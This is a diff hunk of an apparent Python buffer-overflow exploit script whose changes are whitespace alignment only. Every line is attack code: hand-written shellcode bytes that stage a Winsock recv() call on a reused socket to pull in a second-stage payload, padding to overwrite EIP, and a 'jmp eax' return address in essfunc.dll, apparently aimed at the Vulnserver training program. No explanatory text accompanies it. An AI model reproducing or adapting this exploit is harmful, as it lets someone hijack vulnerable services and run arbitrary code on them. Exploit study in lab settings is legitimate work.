@@ -51,35 +51,35 @@ setrecv += "\x58"                       # pop eax
 setrecv += "\x66\x05\x94\x01"           # add ax, 0x194
 
 # Stack Alignment
-setrecv += "\x83\xec\x50"			# sub esp, 0x50
+setrecv += "\x83\xec\x50"               # sub esp, 0x50
 
 # Flags = 0x00000000
-setrecv += "\x31\xd2"			    # xor edx,edx
-setrecv += "\x52"				      # push edx
+setrecv += "\x31\xd2"                   # xor edx,edx
+setrecv += "\x52"                       # push edx
 
 # BufSize = 0x00000200
-setrecv += "\x80\xc6\x02"			# add dh, 0x02
-setrecv += "\x52"				      # push edx
+setrecv += "\x80\xc6\x02"                # add dh, 0x02
+setrecv += "\x52"                        # push edx
 
 # Buffer at 0x00C0F9F0
-setrecv += "\x54"				      # push esp
-setrecv += "\x5b"				      # pop ebx
-setrecv += "\x83\xc3\x4c"			# add ebx, 0x4c
-setrecv += "\x53"				      # push ebx
+setrecv += "\x54"                        # push esp
+setrecv += "\x5b"                        # pop ebx
+setrecv += "\x83\xc3\x4c"                # add ebx, 0x4c
+setrecv += "\x53"                        # push ebx
 
 # Push socket descriptor onto the stack:
-setrecv += "\xFF\x30"			# push dword ptr ds:[eax]
+setrecv += "\xFF\x30"                    # push dword ptr ds:[eax]
 
 # Calling W2_32.recv()
-setrecv += "\xB8\x11\x2C\x25\x40"      # mov eax, 0x40252C11
-setrecv += "\xc1\xe8\x08"              # shr eax, 0x08
-setrecv += "\xff\xd0"                  # call eax
+setrecv += "\xB8\x11\x2C\x25\x40"        # mov eax, 0x40252C11
+setrecv += "\xc1\xe8\x08"                # shr eax, 0x08
+setrecv += "\xff\xd0"                    # call eax
 
 # 70 byte offset to EIP
-paddingeip = "\x41" * (70-len(setrecv))     # offset to EIP
+paddingeip = "\x41" * (70-len(setrecv))  # offset to EIP
      
 
-eax = "\xb1\x11\x50\x62"			     # 0x625011b1 jmp eax essfunc.dll
+eax = "\xb1\x11\x50\x62"                 # 0x625011b1 jmp eax essfunc.dll
 crash = "\x43" * (2000-len(setrecv+paddingeip+eax))  # remaining bytes to crash
 
 
